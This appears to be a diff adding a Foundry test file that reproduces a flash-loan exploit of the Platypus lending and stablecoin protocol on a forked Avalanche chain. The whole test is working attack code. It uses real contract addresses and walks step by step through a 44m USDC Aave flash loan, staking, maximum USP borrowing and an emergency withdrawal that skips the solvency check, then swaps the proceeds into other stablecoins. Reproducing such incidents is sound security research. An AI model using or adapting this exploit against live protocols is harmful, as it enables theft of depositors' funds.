@@ -1,0 +1,160 @@
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.10;
+
+import "forge-std/Test.sol";
+
+interface PlatypusPool {
+    function deposit(address token, uint256 amount, address to, uint256 deadline) external;
+    function withdraw(address token, uint256 liquidity, uint256 minimumAmount, address to, uint256 deadline) external;
+    function swap(
+        address fromToken,
+        address toToken,
+        uint256 fromAmount,
+        uint256 minimumToAmount,
+        address to,
+        uint256 deadline
+    ) external;
+}
+
+interface MasterPlatypusV4 {
+    function deposit(uint256 _pid, uint256 _amount) external;
+    function emergencyWithdraw(uint256 _pid) external;
+}
+
+interface IERC20 {
+    function balanceOf(address account) external view returns (uint256);
+    function decimals() external view returns (uint8);
+    function approve(address spender, uint256 amount) external returns (bool);
+    function transfer(address recipient, uint256 amount) external returns (bool);
+    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
+}
+
+interface IAaveV3{
+    function flashLoanSimple(address _receiver, address _reserve, uint256 _amount, bytes calldata _params, uint16 _referralCode) external;
+}
+interface PlatypusTreasure {
+    struct PositionView {
+        uint256 collateralAmount;
+        uint256 collateralUSD;
+        uint256 borrowLimitUSP;
+        uint256 liquidateLimitUSP;
+        uint256 debtAmountUSP;
+        uint256 debtShare;
+        uint256 healthFactor; // `healthFactor` is 0 if `debtAmountUSP` is 0
+        bool liquidable;
+    }
+
+    function positionView(address _user, address _token) external view returns (PositionView memory);
+    function borrow(address _token, uint256 _borrowAmount) external;
+}
+
+contract ContractTest is Test {
+    IERC20 USDC = IERC20(0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E);
+    IERC20 USP = IERC20(0xdaCDe03d7Ab4D81fEDdc3a20fAA89aBAc9072CE2);
+    IERC20 USDC_E = IERC20(0xA7D7079b0FEaD91F3e65f86E8915Cb59c1a4C664);
+    IERC20 USDT = IERC20(0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7);
+    IERC20 USDT_E = IERC20(0xc7198437980c041c805A1EDcbA50c1Ce5db95118);
+    IERC20 BUSD = IERC20(0x9C9e5fD8bbc25984B178FdCE6117Defa39d2db39);
+    IERC20 DAI_E = IERC20(0xd586E7F844cEa2F87f50152665BCbc2C279D8d70);
+    IERC20 LPUSDC = IERC20(0xAEf735B1E7EcfAf8209ea46610585817Dc0a2E16);
+    PlatypusPool Pool = PlatypusPool(0x66357dCaCe80431aee0A7507e2E361B7e2402370);
+    MasterPlatypusV4 Master = MasterPlatypusV4(0xfF6934aAC9C94E1C39358D4fDCF70aeca77D0AB0);
+    PlatypusTreasure Treasure = PlatypusTreasure(0x061da45081ACE6ce1622b9787b68aa7033621438);
+    IAaveV3 aaveV3 = IAaveV3(0x794a61358D6845594F94dc1DB02A252b5b4814aD);
+
+    function setUp() public {
+        vm.createSelectFork("https://rpc.ankr.com/avalanche", 26_343_613);
+        vm.label(address(USDC), "USDC");
+        vm.label(address(USP), "USP");
+        vm.label(address(USDC_E), "USDC_E");
+        vm.label(address(USDT), "USDT");
+        vm.label(address(USDT_E), "USDT_E");
+        vm.label(address(BUSD), "BUSD");
+        vm.label(address(DAI_E), "DAI_E");
+        vm.label(address(LPUSDC), "LPUSDC");
+        vm.label(address(Pool), "Pool");
+        vm.label(address(Master), "Master");
+        vm.label(address(Treasure), "Treasure");
+        vm.label(address(aaveV3), "aaveV3");
+    }
+
+    function testExploit() external {
+
+        // setp 1: flash loan 44m USDC from AaveV3
+        aaveV3.flashLoanSimple(address(this), address(USDC), 44_000_000 * 1e6, new bytes(0), 0);
+
+        emit log_named_decimal_uint(
+            "Attacker USP balance after exploit", USP.balanceOf(address(this)), USP.decimals()
+            );
+        emit log_named_decimal_uint(
+            "Attacker USDC balance after exploit", USDC.balanceOf(address(this)), USDC.decimals()
+            );
+        emit log_named_decimal_uint(
+            "Attacker USDC_E balance after exploit", USDC_E.balanceOf(address(this)), USDC_E.decimals()
+            );
+        emit log_named_decimal_uint(
+            "Attacker USDT balance after exploit", USDT.balanceOf(address(this)), USDT.decimals()
+            );
+        emit log_named_decimal_uint(
+            "Attacker USDT_E balance after exploit", USDT_E.balanceOf(address(this)), USDT_E.decimals()
+            );
+        emit log_named_decimal_uint(
+            "Attacker BUSD balance after exploit", BUSD.balanceOf(address(this)), BUSD.decimals()
+            );
+        emit log_named_decimal_uint(
+            "Attacker DAI_E balance after exploit", DAI_E.balanceOf(address(this)), DAI_E.decimals()
+            );
+    }
+
+    function executeOperation(
+        address asset,
+        uint256 amount,
+        uint256 premium,
+        address initator,
+        bytes calldata params
+    ) external returns (bool) {
+        USDC.approve(address(aaveV3), amount + premium);
+        USDC.approve(address(Pool), amount);
+
+        // step 2: deposit 44m USDC to PlatypusPool get LP-USDC
+        Pool.deposit(address(USDC), amount, address(this), block.timestamp); // deposit USDC to LP-USDC
+        uint256 LPUSDCAmount = LPUSDC.balanceOf(address(this));
+        emit log_named_decimal_uint(
+            "Get LPUSDC amount", LPUSDCAmount, LPUSDC.decimals()
+            );
+
+        // step 3: deposit LP-USDC to MasterPlatypus
+        LPUSDC.approve(address(Master), LPUSDCAmount);
+        Master.deposit(4, LPUSDCAmount); 
+
+        // step 4: borrow max USP from Treasure
+        PlatypusTreasure.PositionView memory Position = Treasure.positionView(address(this), address(LPUSDC));
+        uint256 borrowAmount = Position.borrowLimitUSP;
+        Treasure.borrow(address(LPUSDC), borrowAmount); 
+
+        // step 5: emergency withdraw LP-USDC from MasterPlatypus
+        // !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+        // !!!!!! Because emergencyWithdraw() make a solvent check before withdraw LP-USDC !!!!!!!
+        // !!!!!! So we can successfully withdraw LP-USDC from MasterPlatypus              !!!!!!!
+        // !!!!!! Even if we still have a debt in Treasure                                 !!!!!!!
+        // !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+        Master.emergencyWithdraw(4);
+        LPUSDC.approve(address(Pool), LPUSDC.balanceOf(address(this)));
+        Pool.withdraw(address(USDC), LPUSDC.balanceOf(address(this)), 0, address(this), block.timestamp);
+
+        // step 6: swap USP to other stablecoins
+        swapUSPToOtherToken();
+        return true;
+    }
+
+    function swapUSPToOtherToken() internal {
+        USP.approve(address(Pool), 9_000_000 * 1e18);
+        Pool.swap(address(USP), address(USDC), 2_500_000 * 1e18, 0, address(this), block.timestamp);
+        Pool.swap(address(USP), address(USDC_E), 2_000_000 * 1e18, 0, address(this), block.timestamp);
+        Pool.swap(address(USP), address(USDT), 1_600_000 * 1e18, 0, address(this), block.timestamp);
+        Pool.swap(address(USP), address(USDT_E), 1_250_000 * 1e18, 0, address(this), block.timestamp);
+        Pool.swap(address(USP), address(BUSD), 700_000 * 1e18, 0, address(this), block.timestamp);
+        Pool.swap(address(USP), address(DAI_E), 700_000 * 1e18, 0, address(this), block.timestamp);
+    }
+}
